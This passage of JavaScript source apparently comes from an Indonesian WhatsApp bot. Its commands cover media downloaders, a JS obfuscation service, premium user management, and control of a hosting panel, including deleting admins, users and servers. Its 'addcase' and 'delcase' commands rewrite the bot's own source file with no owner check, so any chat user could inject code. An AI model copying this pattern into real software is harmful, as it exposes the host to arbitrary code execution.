   if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');    
  if (!text) return m.reply(`Urlnya mana?\n*Contoh:* ${prefix + command} https://open.spotify.com/track/xxxxxx`)
  Aanz.sendMessage(m.chat, { react: { text: '👒', key: m.key }})
  let urlSpo = linkRegex.test(text)
  if (!urlSpo) return m.reply(`Hanya Support Url Track *(music)*\n*Contoh Url:* https://open.spotify.com/track/xxxxxx`)
  let response = await spotifyDown(text)
  let { nama, title, durasi, thumb, url } = response
  
  if (response) {
  let cap = `*© 𝖲𝗉𝗈𝗍𝗂𝖿𝗒 𝖬𝗎𝗌𝗂𝖼*

*[🏷️] Info Music*
* *Title:* ${title}
* *Durasi:* ${durasi}
* *Artis:* ${nama}
* *Spotify:* ${text}

\`Kamu Dapat Mencari Music Spotify\`\n*Caranya:* ${prefix}spotisearch <music name>`
  await Aanz.sendMessage(m.chat, { text: cap, contextInfo: { mentionedJid: [m.sender], externalAdReply: { mediaUrl: '', mediaType: 1, title: title, body: '© AanzzzCuyxzz', thumbnailUrl: thumb, sourceUrl: '', renderLargerThumbnail: true, showAdAttribution: false } } }, { quoted: m });
 Aanz.sendMessage(m.chat, { audio: { url: url }, mimetype: 'audio/mp4' }, { quoted: m })
  } else {
     m.m.reply(eror)
    }
  break
        
case 'tiktok': {
    if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
async function tiktok(query) {
 return new Promise(async (resolve, reject) => {
 try {
 const encodedParams = new URLSearchParams();
encodedParams.set('url', query);
encodedParams.set('hd', '1');

 const response = await axios({
 method: 'POST',
 url: 'https://tikwm.com/api/',
 headers: {
 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
 'Cookie': 'current_language=en',
 'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36'
 },
 data: encodedParams
 });
 const videos = response.data.data;
 const result = {
 title: videos.title,
 cover: videos.cover,
 origin_cover: videos.origin_cover,
 no_watermark: videos.play,
 watermark: videos.wmplay,
 music: videos.music
 };
 resolve(result);
 } catch (error) {
 reject(error);
 }
 });
}
if (args.length == 0) return m.reply(`☘️ *Link Tiktoknya Mana?*`)
if (!isUrl(args[0])) return m.reply('⚠️ *Itu Bukan Link Yang Benar*')
m.reply(mess.wait)
let cap = ``
let res = await tiktok(`${args[0]}`)
Aanz.sendMessage(m.chat, { video: { url: res.no_watermark }, caption: cap, fileName: `tiktok.mp4`, mimetype: 'video/mp4' }).then(() => {
Aanz.sendMessage(m.chat, { audio: { url: res.music }, fileName: `tiktok.mp3`, mimetype: 'audio/mp4' })
})
}
break
case 'clear': {
if (!isCreator) return m.reply('You do not have permission to access this feature.');
                fs.readdir("./sessionserver", async function(err, files) {
                    if (err) {
                        console.log('Unable to scan directory: ' + err);
                        return m.reply('Unable to scan directory: ' + err);
                    }
                    let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
                        item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
                    )
                    console.log(filteredArray.length);
                    let teks = `Detected ${filteredArray.length} junk files\n\n`
                    if (filteredArray.length == 0) return m.reply(teks)
                    filteredArray.map(function(e, i) {
                        teks += (i + 1) + `. ${e}\n`
                    })
                    m.reply(teks)
                    await sleep(2000)
                    m.reply("Deleting junk files...")
                    await filteredArray.forEach(function(file) {
                        fs.unlinkSync(`./sessionserver/${file}`)
                    });
                    await sleep(2000)
                    m.reply("Successfully deleted all the trash in the session folder")
                });
            }
            break

     
case 'self': {
if (!isCreator) return m.reply('You do not have permission to access this feature.')
Aanz.public = false
m.reply(`Succes switch mode bot sekarang mode self`)
}
break

case 'public': {
if (!isCreator) return m.reply('You do not have permission to access this feature')
Aanz.public = true
m.reply(`Succes switch mode bot sekarang mode public`)
}
break

case 'decrypt':
    if (!isPrem) return m.reply('*You do not have permission to access this feature.*');
    if (!text) return m.reply('Mana textnya');
    const memek = await deobfuscate(text);
    const water = `/*\n * Deobfuscated By AanzzzCuyxzz\n * Buy Script Pv me\n*/\n\n`;
    const lastt = water + memek; 
    await Aanz.sendMessage(m.chat, { 
        document: Buffer.from(lastt, 'utf-8'), 
        fileName: 'deobfuscated_code.js', 
        mimetype: 'application/javascript' 
    }, { quoted: m, caption: 'Sukses Deobfuscation' });

    break;
case 'encrypt':
    if (!isPrem) return m.reply('*Khusus premium atau developer bot.*');
    if (!text) return m.reply('Mana textnya');

    // Proses deobfuscation
    const kkkk = await EncryptJs(text);

    // Pastikan hasilDeobfuscate adalah string dan hapus tanda kutip di awal dan akhir
    const cleanResult = kkkk.replace(/^"|"$/g, ''); // Menghapus tanda kutip di awal dan akhir

    // Tambahkan watermark di awal hasil
    const watermark = `/*\n * Obfuscated By AanzzzCuyxzz\n * Buy Script Pv me\n\n*/\n\n`;
    const finalResult = watermark + cleanResult; // Gabungkan watermark dengan hasil asli

    // Mengirim hasil sebagai file JavaScript
    await Aanz.sendMessage(m.chat, { 
        document: Buffer.from(finalResult, 'utf-8'), 
        fileName: 'obfuscated_code.js', // Nama file yang akan dikirim
        mimetype: 'application/javascript' // MIME type untuk JavaScript
    }, { quoted: m, caption: 'Suksess' });

    break;
case 'mediafire':{
    if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 async function mediafiredll(url) {
 try {
 // Mengubah URL agar dapat diterjemahkan melalui layanan proxy
 const res = await axios.get(`https://www-mediafire-com.translate.goog/${url.replace('https://www.mediafire.com/', '')}?_x_tr_sl=en&_x_tr_tl=fr&_x_tr_hl=en&_x_tr_pto=wapp`);
 const $ = cheerio.load(res.data);
 
 // Mengambil data file dari halaman Mediafire
 const fileurl = $('#downloadButton').attr('href');
 const filename = $('body > main > div.content > div.center > div > div.dl-btn-cont > div.dl-btn-labelWrap > div.promoDownloadName.notranslate > div')
 .attr('title')
 .replace(/\s+/g, '') // Menghapus semua spasi dan newline
 .trim(); // Membersihkan spasi ekstra

 const date = $('body > main > div.content > div.center > div > div.dl-info > ul > li:nth-child(2) > span').text().trim();
 const filesize = $('#downloadButton').text()
 .replace('Download', '')
 .replace(/[()]/g, '') // Menghapus tanda kurung
 .replace(/\s+/g, '') // Menghapus spasi berlebih
 .trim(); 

 // Mendapatkan tipe file dari header HTTP
 const rese = await axios.head(fileurl);
 const filetype = rese.headers['content-type'];

 return { filename, filesize, date, filetype, fileurl };
 } catch (err) {
 console.error('Error fetching Mediafire details:', err);
 throw new Error('Gagal mendapatkan detail file dari Mediafire.');
 }
 }

 // Cek apakah input URL diberikan
 let inputExample = `*Contoh*: ${prefix + command} https://www.mediafire.com/file/xxxxxxx`;
 if (!text) return m.reply(inputExample);

 try {
 // Ambil detail file
 const dataJson = await mediafiredll(text);
 const { filename, filesize, date, filetype, fileurl } = dataJson;

 // Memastikan ukuran file tidak melebihi batas 100 MB
 if (parseFloat(filesize.split('MB')[0]) >= 100) {
 return m.reply('*File terlalu besar! Maksimal ukuran adalah 100 MB.*');
 }

 await sleep(500); // Menunggu sejenak untuk pengalaman pengguna yang lebih baik

 // Format pesan informasi file
 const caption = `≡ *MEDIAFIRE*

▢ *Nama* : ${filename}
▢ *Ukuran* : ${filesize}
▢ *Tipe* : ${filetype}
▢ *Diunggah* : ${date}`;

 // Kirim file sebagai dokumen ke pengguna
 await Aanz.sendMessage(
 m.chat, 
 { 
 document: { url: fileurl }, 
 fileName: filename, 
 caption: caption, 
 mimetype: filetype 
 }, 
 { quoted: m }
 );
 } catch (err) {
 m.reply(`Terjadi kesalahan: ${err.message}`);
 }
}
break;

case 'addprem': {
if (!isCreator) return m.reply('Khusus developer')
const swn = args.join(" ")
const pcknm = swn.split("|")[0];
const atnm = swn.split("|")[1];
if (!pcknm) return m.reply(`Penggunaan :\n*${prefix}addprem* @tag|waktu\n*${prefix}addprem* nomor|waktu\n\nContoh : ${prefix+command} @tag|30d`)
if (!atnm) return m.reply(`Mau yang berapa hari?`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (users) {
prem.addPremiumUser((pcknm.replace('@','')+'@s.whatsapp.net').replace(' @','@'), atnm, premium)
m.reply('Sukses')
} else {
var cekap = await Aanz.onWhatsApp(pcknm+"@s.whatsapp.net")
if (cekap.length == 0) return m.reply(`Masukkan nomer yang valid/terdaftar di WhatsApp`)
prem.addPremiumUser((pcknm.replace('@','')+'@s.whatsapp.net').replace(' @','@'), atnm, premium)
m.reply('Sukses')
}}
break
case 'renamecase':
    if (!q) return m.reply('Format tidak valid. Contoh: renamecase izintes|izintesnew');
    if (!isCreator) return m.reply('Khusus owner');

    // Pisahkan input menjadi nama case lama dan nama case baru
    const [oldCaseName, newCaseName] = q.split('|').map(name => name.trim());

    if (!oldCaseName || !newCaseName) {
        return m.reply('Format tidak valid. Contoh: renamecase izintes|izintesnew');
    }

    // Path ke file yang berisi switch-case
    const rinembos = path.join(__dirname, 'Aanz.js');

    try {
        // Baca file secara sinkron
        let data = fs.readFileSync(rinembos, 'utf8');

        // Ekspresi reguler untuk mencari case berdasarkan nama lama
        const caseRegex = new RegExp(`case\\s+'${oldCaseName}'\\s*:\\s*`, 'g');
        const startIndex = data.search(caseRegex);

        if (startIndex === -1) {  // Perbaikan dari - menjadi -1
            return m.reply(`Case '${oldCaseName}' tidak ditemukan.`);
        }

        // Cari case berikutnya setelah case yang dicari
        const nextCasePattern = /case\s+/g;  // Perbaikan ekspresi reguler
        nextCasePattern.lastIndex = startIndex + 1;
        const nextCaseMatch = nextCasePattern.exec(data);

        // Update nama case
        const updatedData = data.replace(caseRegex, `case '${newCaseName}':`);
        
        // Tulis kembali ke file
        fs.writeFileSync(rinembos, updatedData, 'utf8');
        m.reply(`Case '${oldCaseName}' sukses menjadi '${newCaseName}'!`);
    } catch (err) {
        console.error(err);
        m.reply('Terjadi kesalahan saat membaca atau menulis file.');
    }
    break;
    case 'editcase':
    if (!q) return m.reply('Mana case yang ingin diedit? Format: .editcase case \'namafitur\':\n\n<kode baru>');
    if (!isCreator) return m.reply('Khusus owner');

    const caseNameRegex = /case\s+'([^']+)':/; 
    const match = q.match(caseNameRegex);

    if (!match) {
        return m.reply('Format tidak benar. Contoh: .editcase case \'namafitur\':\n\n<kode baru>');
    }

    const caseName = match[1]; 
    const newCode = q.replace(caseNameRegex, '').trim(); 

   
    const filenyabang = path.join(__dirname, 'Aanz.js');

    try {
        
        let data = fs.readFileSync(filenyabang, 'utf8');
        const caseRegex = new RegExp(`case\\s+'${caseName}'\\s*:\\s*`, 'g');
        const startIndex = data.search(caseRegex);

        if (startIndex !== -1) {
            let endIndex = -1;
            const breakPattern = /break\s*;/g;
            breakPattern.lastIndex = startIndex;
            const breakMatch = breakPattern.exec(data);

            if (breakMatch) {
                endIndex = breakMatch.index + breakMatch[0].length;
            }

           
            const nextCasePattern = /case\s+'/g;
            nextCasePattern.lastIndex = startIndex + 1;
            const nextCaseMatch = nextCasePattern.exec(data);

            if (nextCaseMatch && (endIndex === -1 || nextCaseMatch.index < endIndex)) {
                endIndex = nextCaseMatch.index;
            }

            if (endIndex !== -1) {
                const updatedCode = `case '${caseName}':\n${newCode}\n`;
                data = data.slice(0, startIndex) + updatedCode + data.slice(endIndex);
                fs.writeFileSync(filenyabang, data, 'utf8');
                m.reply(`Succesfully update case ${q}!`);
            } else {
                m.reply('Maaf, tidak ditemukan akhir yang jelas untuk case tersebut.');
            }
        } else {
            m.reply('Sorry, case nya gada di file Aanz.js');
        }
    } catch (err) {
        console.error(err);
        m.reply('Eror, silahkan cek console untuk lihat apa yang eror');
    }
    break;
    case 'getfunc':
    if (!isCreator) return m.reply('Khusus owner');
    
    const AanzZcoder = path.join(__dirname, 'Aanz.js');
    
    try {
        const data = fs.readFileSync(AanzZcoder, 'utf8');
        
        if (!q) {
           
            const funcRegex = /async function (\w+)\s*\([^)]*\)\s*{/g;
            let functionsList = [];
            let match;

            
            while ((match = funcRegex.exec(data)) !== null) {
                functionsList.push(match[1]); 
            }

            if (functionsList.length > 0) {

                m.reply(`Mau cari function apa?\n\n${functionsList.map((func, index) => `${index + 1}. ${func}`).join('\n')}`);
            } else {
                m.reply('Tidak ada async function yang ditemukan.');
            }
            return; 
        }

        
        const funcRegex = new RegExp(`async function ${q}\\s*\\([^)]*\\)\\s*{`, 'g');
        const startIndex = data.search(funcRegex);
        
        if (startIndex !== -1) {
            let openBrackets = 0;
            let endIndex = startIndex;
            for (let i = startIndex; i < data.length; i++) {
                if (data[i] === '{') {
                    openBrackets++;
                } else if (data[i] === '}') {
                    openBrackets--;
                    if (openBrackets === 0) {
                        endIndex = i;
                        break;
                    }
                }
            }
            
            const extrakbang = data.slice(startIndex, endIndex + 1);
            m.reply(`*YOUR FUNCTION*:\n\n${extrakbang}`);
        } else {
            m.reply('Nama func nya gada bro, coba cari lain');
        }
    } catch (err) {
        console.error(err);
        m.reply('Error! cek console mu.');
    }
    break;
case 'addcase': {
if (!text) return m.reply(`Contoh: ${prefix+command} case nya`);
const namaFile = path.join(__dirname, 'Aanz.js');
const caseBaru = `${text}\n\n`;
const tambahCase = (data, caseBaru) => {
const posisiDefault = data.lastIndexOf("default:");
if (posisiDefault !== -1) {
const kodeBaruLengkap = data.slice(0, posisiDefault) + caseBaru + data.slice(posisiDefault);
return { success: true, kodeBaruLengkap };
} else {
return { success: false, message: "Tidak dapat menemukan case default di dalam file!" };
}};
fs.readFile(namaFile, 'utf8', (err, data) => {
if (err) {
console.error('Terjadi kesalahan saat membaca file:', err);
return m.reply(`Terjadi kesalahan saat membaca file: ${err.message}`);
}
const result = tambahCase(data, caseBaru);
if (result.success) {
fs.writeFile(namaFile, result.kodeBaruLengkap, 'utf8', (err) => {
if (err) {
console.error('Terjadi kesalahan saat menulis file:', err);
return m.reply(`Terjadi kesalahan saat menulis file: ${err.message}`);
} else {
console.log('Sukses menambahkan case baru:');
console.log(caseBaru);
return m.reply('Sukses menambahkan case!');
}});
} else {
console.error(result.message);
return m.reply(result.message);
}});
}
break            
case 'delcase': {
if (!text) return m.reply(`Contoh: ${prefix+command} nama case`);
const fs = require('fs').promises;
async function dellCase(filePath, caseNameToRemove) {
try {
let data = await fs.readFile(filePath, 'utf8');
const regex = new RegExp(`case\\s+'${caseNameToRemove}':[\\s\\S]*?break`, 'g');
const modifiedData = data.replace(regex, '');
if (data === modifiedData) {
m.reply('Case tidak ditemukan atau sudah dihapus.');
return;
}
await fs.writeFile(filePath, modifiedData, 'utf8');
m.reply('Sukses menghapus case!');
} catch (err) {
m.reply(`Terjadi kesalahan: ${err.message}`);
}}
dellCase('./Aanz.js', q);
break;
}
        
        case 'getcase':
    if (!q) return m.reply('Mana nama case yang ingin diambil?');
   if (!isCreator) return m.reply('Khusus owner')
    // Path ke file yang berisi switch-case
    const filePath = path.join(__dirname, 'Aanz.js');
    
    try {
        // Baca file secara sinkron
        const data = fs.readFileSync(filePath, 'utf8');
        
        // Ekspresi reguler untuk mencari case berdasarkan nama
        const caseRegex = new RegExp(`case\\s+'${q}'\\s*:\\s*`, 'g');
        const startIndex = data.search(caseRegex);
        
        if (startIndex !== -1) {
            let endIndex = -1;
            const breakPattern = /break\s*;/g;
            breakPattern.lastIndex = startIndex;
            const breakMatch = breakPattern.exec(data);
            
            if (breakMatch) {
                endIndex = breakMatch.index + breakMatch[0].length;
            }
            
            // Cari case berikutnya setelah case yang dicari
            const nextCasePattern = /case\s+'/g;
            nextCasePattern.lastIndex = startIndex + 1;
            const nextCaseMatch = nextCasePattern.exec(data);
            
            if (nextCaseMatch && (endIndex === -1 || nextCaseMatch.index < endIndex)) {
                endIndex = nextCaseMatch.index;
            }
            
            if (endIndex !== -1) {
                // Ekstrak isi case
                const caseCode = data.slice(startIndex, endIndex);
                m.reply(`Nih case:\n\n${caseCode}`);
            } else {
                // Jika tidak ditemukan batas akhir
                m.reply('Maaf, tidak ditemukan akhir yang jelas untuk case tersebut.');
            }
        } else {
            // Jika case tidak ditemukan, kirimkan pesan
            m.reply('Maaf, case tidak ada dalam file Aanz.js');
        }
    } catch (err) {
        console.error(err);
        m.reply('Terjadi kesalahan saat membaca file.');
    }
    break;



case 'delprem': {
if (!isCreator) return m.reply('Khusus developer')
if (!args[0]) return m.reply(`Penggunaan :\n*${prefix}delprem* @tag\n*${prefix}delprem* nomor`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (users) {
premium.splice(prem.getPremiumPosition(users, premium), 1)
fs.writeFileSync('./serverside/system/premium.json', JSON.stringify(premium))
m.reply('Sukses!')
} else {
var cekpr = await Aanz.onWhatsApp(args[0]+"@s.whatsapp.net")
if (cekpr.length == 0) return m.reply(`Masukkan nomer yang valid/terdaftar di WhatsApp`)
premium.splice(prem.getPremiumPosition(args[0] + '@s.whatsapp.net', premium), 1)
fs.writeFileSync('./serverside/system/premium.json', JSON.stringify(premium))
m.reply('Sukses!')
}}
break




case 'encryptv2':
    if (!isPrem) return m.reply('*Khusus premium atau developer bot.*');
    if (!text) return m.reply('Mana textnya');
    // Proses deobfuscation
    const kkkkk = await EncryptJs2(text);

    // Pastikan hasilDeobfuscate adalah string dan hapus tanda kutip di awal dan akhir
    const cleanResulti = kkkkk.replace(/^"|"$/g, ''); // Menghapus tanda kutip di awal dan akhir

    // Tambahkan watermark di awal hasil
    const watermarkk = `/*\n * Obfuscated By AanzzzCuyxzz\n * Buy Script Pv me\n\n*/\n\n`;
    const utm = watermarkk + cleanResulti; // Gabungkan watermark dengan hasil asli

    // Mengirim hasil sebagai file JavaScript
    await Aanz.sendMessage(m.chat, { 
        document: Buffer.from(utm, 'utf-8'), 
        fileName: 'obfuscated_code.js', // Nama file yang akan dikirim
        mimetype: 'application/javascript' // MIME type untuk JavaScript
    }, { quoted: m, caption: 'Suksess' });

    break;
case 'upcapikey':{
    if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 if (text || m.quoted) {
 const newteks = m.quoted ? m.quoted.text : text; // Dapatkan teks dari pesan yang dibalas atau input

 // Update global capikey dengan nilai baru
 global.capikey = newteks;

 // Kirim balasan bahwa capikey telah berhasil diganti
 await Aanz.sendMessage(m.chat, { text: "_Berhasil Mengganti Capikey Panel✅_" }, { quoted: m });
 } else {
 // Jika format salah, kirimkan pesan contoh format yang benar
 await Aanz.sendMessage(m.chat, { text: `*Format salah!*\nContoh: ${prefix + command} <Capikey>` }, { quoted: m });
 }
}
break;
case 'deladmin':{
    if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 if (!args[0]) return m.reply(`Untuk melihat ID silahkan ketik ${prefix}listadmin`);
 
 let cek = await fetch(domain + "/api/application/users?page=1", {
 "method": "GET",
 "headers": {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + apikey
 }
 });

 let res2 = await cek.json();
 let users = res2.data;
 let getid = null;
 let idadmin = null;

 // Loop users untuk cari admin yang sesuai dengan ID
 for (let e of users) {
 if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
 getid = e.attributes.username;
 idadmin = e.attributes.id;

 try {
 let delusr = await fetch(domain + `/api/application/users/${idadmin}`, {
 "method": "DELETE",
 "headers": {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + apikey
 }
 });

 // Cek apakah penghapusan admin berhasil
 if (!delusr.ok) {
 throw new Error('Gagal menghapus admin!');
 }

 m.reply(`Berhasil menghapus admin panel *${getid}*`);
 } catch (err) {
 console.error(err);
 m.reply(`❌ Terjadi kesalahan saat mencoba menghapus admin: ${err.message}`);
 }
 break; // Keluar dari loop setelah berhasil
 }
 }

 // Jika admin tidak ditemukan
 if (idadmin == null) {
 m.reply("ID admin tidak ditemukan atau admin tidak valid!");
 }
}
break

case 'delserver':{
    if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 let srv = args[0]; // ID server yang ingin dihapus
 if (!srv) return m.reply('ID servernya mana?');

 try {
 let f = await fetch(domain + "/api/application/servers/" + srv, {
 "method": "DELETE",
 "headers": {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + apikey,
 }
 });

 // Cek respons
 if (f.ok) {
 m.reply('✅ Sukses menghapus server!');
 } else {
 let res = await f.json();
 let errorMessage = res.errors?.[0]?.detail || 'Server tidak ditemukan!';
 m.reply(`❌ Gagal menghapus server: ${errorMessage}`);
 }
 } catch (e) {
 console.error(e);
 m.reply('❌ Terjadi kesalahan saat menghapus server.');
 }
}
break

case 'deluser':{
    if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 let usr = args[0]; // ID user yang ingin dihapus
 if (!usr) return m.reply('ID usernya mana?');

 try {
 let f = await fetch(domain + "/api/application/users/" + usr, {
 "method": "DELETE",
 "headers": {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + apikey,
 }
 });

 // Cek respons
 if (f.ok) {
 m.reply('✅ Sukses menghapus user!');
 } else {
 let res = await f.json();
 let errorMessage = res.errors?.[0]?.detail || 'User tidak ditemukan!';
 m.reply(`❌ Gagal menghapus user: ${errorMessage}`);
 }
 } catch (e) {
 console.error(e);
 m.reply('❌ Terjadi kesalahan saat menghapus user.');
 }
}
break

case 'listadmin':
{
 if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 let page = args[0] ? args[0] : '1';
 let f = await fetch(domain + "/api/application/users?page=" + page, {
 "method": "GET",
 "headers": {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + apikey
 }
 });

 let res = await f.json();
 let users = res.data;
 const videoUrl = 'https://files.catbox.moe/iyqnvx.mp4';

 let teks = `╭─❒ *List Admin Server*\n`;

 for (let user of users) {
 let u = user.attributes;
 if (u.root_admin) { // Cek apakah user adalah admin
 teks += `├ ID : ${u.id}\n`;
 teks += `├ Username : ${u.username}\n`;
 teks += `├ Nama Depan : ${u.first_name}\n`;
 teks += `├ Nama Belakang : ${u.last_name}\n`;
 teks += `├ Status : ${u.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
 teks += `├───────────────\n`;
 }
 }

 teks += `╰─❒ Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
 teks += ` Total Admin: ${res.meta.pagination.count}\n`;

 if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
 teks += `\n➜ Ketik: *${prefix + command} ${res.meta.pagination.current_page + 1}* untuk melihat halaman berikutnya.`;
 }

 await Aanz.sendMessage(m.chat, {
 video: { url: videoUrl },
 caption: teks,
 gifPlayback: true,
 gifAttribution: 1,
 contextInfo: {
 mentionedJid: [m.sender],
 externalAdReply: {
 showAdAttribution: true,
 title: 'AanzCuyxzzz - V2',
 body: 'Bot WhatsApp multi-fungsi menggunakan @Whiskeysockets/baileys.',
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 }, { quoted: m });
}
break;




case 'listuser':{
    if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 let page = args[0] ? args[0] : '1';

 let f = await fetch(domain + "/api/application/users?page=" + page, {
 method: "GET",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + apikey
 }
 });

 let res = await f.json();
 if (res.errors) return m.reply(`Gagal mengambil data user: ${JSON.stringify(res.errors[0], null, 2)}`);
 
 let users = res.data;
 if (!users || users.length === 0) return m.reply("Tidak ada user yang ditemukan.");

 let messageText = "Berikut list usernya:\n\n";
 for (let user of users) {
 let u = user.attributes;
 messageText += `ID: ${u.id} - Status: ${u.server_limit === null ? 'Tidak aktif' : 'Aktif'}\n`;
 messageText += `Username: ${u.username}\n`;
 messageText += `Nama: ${u.first_name} ${u.last_name}\n\n`;
 }

 messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
 messageText += `Total user: ${res.meta.pagination.total}`;
 await Aanz.sendMessage(m.chat, { text: messageText }, { quoted: m });

 if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
 m.reply(`Gunakan perintah *${prefix + command} ${parseInt(res.meta.pagination.current_page) + 1}* untuk melihat halaman selanjutnya.`);
 }
}
break

case 'listserver':
{
 if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');

 let page = parseInt(args[0]) || 1; // Default ke halaman 1 jika tidak ada input

 try {
 let f = await fetch(domain + `/api/application/servers?page=${page}`, {
 method: "GET",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": `Bearer ${apikey}`
 }
 });

 let res = await f.json();

 // Cek jika ada error dari API
 if (res.errors) {
 return m.reply(`❌ Gagal mengambil data server:\n${JSON.stringify(res.errors[0], null, 2)}`);
 }

 let servers = res.data;

 // Cek jika tidak ada server ditemukan
 if (!servers || servers.length === 0) {
 return m.reply("❌ Tidak ada server yang ditemukan.");
 }

 const videoUrl = 'https://files.catbox.moe/iyqnvx.mp4'; // URL video atau GIF

 let teks = `╭─❒ *List Server*\n`;

 for (let server of servers) {
 let s = server.attributes;
 teks += `├ *ID Server*: ${s.id}\n`;
 teks += `├ *Nama*: ${s.name}\n`;
 teks += `├ *Deskripsi*: ${s.description}\n`;
 teks += `├ *Status*: ${s.suspended ? 'Suspend' : 'Aktif'}\n`;
 teks += `├───────────────\n`;
 }

 teks += `╰─❒ *Halaman*: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
 teks += ` *Total Server*: ${res.meta.pagination.total}\n`;

 // Navigasi halaman
 if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
 teks += `\n➜ Ketik: *${prefix + command} ${res.meta.pagination.current_page + 1}* untuk halaman berikutnya.`;
 }

 // Kirim pesan
 await Aanz.sendMessage(m.chat, {
 video: { url: videoUrl },
 caption: teks,
 gifPlayback: true,
 gifAttribution: 1,
 contextInfo: {
 mentionedJid: [m.sender],
 externalAdReply: {
 showAdAttribution: true,
 title: 'AanzCuyxzzz - List Server',
 body: 'Bot WhatsApp multi-fungsi menggunakan @Whiskeysockets/baileys.',
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 }, { quoted: m });

 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat mengambil data server.");
 }
}
break;

case 'unli':
{
 if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 let t = text.split('-');
 if (t.length < 2) return m.reply(`Contoh: ${prefix + command} username-nomer`);

 let username = t[0].trim();
 let u =
 t[1] // Jika ada teks setelah '-'
 ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
 : m.mentionedJid && m.mentionedJid[0]
 ? m.mentionedJid[0]
 : m.quoted
 ? m.quoted.sender
 : null;

 if (!u) return m.reply("Nomor target tidak valid. Silakan mention atau tulis nomor setelah tanda '-'.");

 let name = username;
 let email = username + "@gmail.com";
 let ownername = global.namaowner || "Pemilik Bot";
 let egg = "15"; // Egg ID
 let loc = "1"; // Lokasi server
 let memo = "0"; // Memori unlimited
 let cpu = "0"; // CPU unlimited
 let disk = "0"; // Disk unlimited
 let password = crypto.randomBytes(5).toString('hex');

 try {
 // Buat pengguna
 let f = await fetch(domain + "/api/application/users", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + apikey,
 },
 body: JSON.stringify({
 email: email,
 username: username,
 first_name: username,
 last_name: username,
 language: "en",
 password: password.toString(),
 }),
 });
 let data = await f.json();
 if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

 let user = data.attributes;

 // Ambil detail Egg
 let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
 method: "GET",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + apikey,
 },
 });
 let eggData = await f2.json();
 let startupCmd = eggData.attributes.startup;

 // Buat server
 let f3 = await fetch(domain + "/api/application/servers", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + apikey,
 },
 body: JSON.stringify({
 name: name,
 description: "Server Unlimited",
 user: user.id,
 egg: parseInt(egg),
 docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
 startup: startupCmd,
 environment: {
 INST: "npm",
 USER_UPLOAD: "0",
 AUTO_UPDATE: "0",
 CMD_RUN: "npm start",
 },
 limits: {
 memory: memo,
 swap: 0,
 disk: disk,
 io: 500,
 cpu: cpu,
 },
 feature_limits: {
 databases: 0,
 backups: 0,
 allocations: 1,
 },
 deploy: {
 locations: [parseInt(loc)],
 dedicated_ip: false,
 port_range: [],
 },
 }),
 });
 let serverRes = await f3.json();
 if (serverRes.errors) return m.reply(JSON.stringify(serverRes.errors[0], null, 2));

 let server = serverRes.attributes;

 // URL video thumbnail
 const videoUrl = 'https://files.catbox.moe/iyqnvx.mp4'; // Ganti dengan URL video

 // Kirim pesan ke target
 let ctf = `┌───「 *AanzCuyxzzz-V2* 」───
│ *Username* : ${user.username}
│ *Password* : ${password}
│ *Link Panel* : ${domain}
└───────────────────
> *_© Developer : AanzCuyxzzz_*`;

 await Aanz.sendMessage(u, {
 video: { url: videoUrl },
 caption: ctf,
 gifPlayback: true,
 contextInfo: {
 externalAdReply: {
 title: 'Unlimited Server Created',
 body: 'Bot WhatsApp Multi-Fungsi',
 thumbnailUrl: 'https://example.com/thumbnail.jpg', // Ganti URL thumbnail jika ada
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
